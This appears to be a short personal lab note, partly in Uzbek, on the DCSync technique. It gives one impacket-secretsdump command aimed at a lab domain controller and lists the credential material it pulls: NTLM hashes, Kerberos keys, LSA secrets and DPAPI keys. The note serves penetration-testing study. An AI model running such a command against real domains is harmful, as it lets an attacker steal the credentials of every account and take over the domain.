---
title: DCSync va SecretsDump
tags: [dcsync, secretsdump, active-directory]
---

# DCSync va SecretsDump

## Lab command
```bash
impacket-secretsdump 'visual.local/roy.ada@192.168.60.76' -dc-ip 192.168.60.76
```

Output Impacket DRSUAPI method orqali NTDS.DIT secrets olayotganini ko‘rsatadi.

## Olingan materiallar
- Local SAM hashes
- LSA secrets
- Machine-account keys
- `DefaultPassword`
- DPAPI system keys
- `NL$KM` material
- Domain NTLM hashes
- Kerberos keys

DCSync — kerakli directory replication permissions mavjud bo‘lsa, Domain Controller'dan replication mexanizmi orqali credential material so‘rash texnikasi.

![[13 - DCSync Help.png]]
![[12 - SecretsDump.png]]
